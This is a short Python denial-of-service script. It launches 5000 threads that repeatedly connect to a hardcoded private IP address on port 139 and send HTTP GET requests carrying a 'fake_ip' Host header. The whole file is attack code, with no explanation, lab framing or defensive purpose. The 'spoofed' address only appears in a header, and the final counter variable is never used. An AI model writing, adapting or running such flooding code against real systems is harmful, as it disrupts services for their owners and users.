import socket
import threading
target = '192.168.111.204'
fake_ip = '182.21.20.32'
port = 139
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        print("send")
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()
attack_num = 0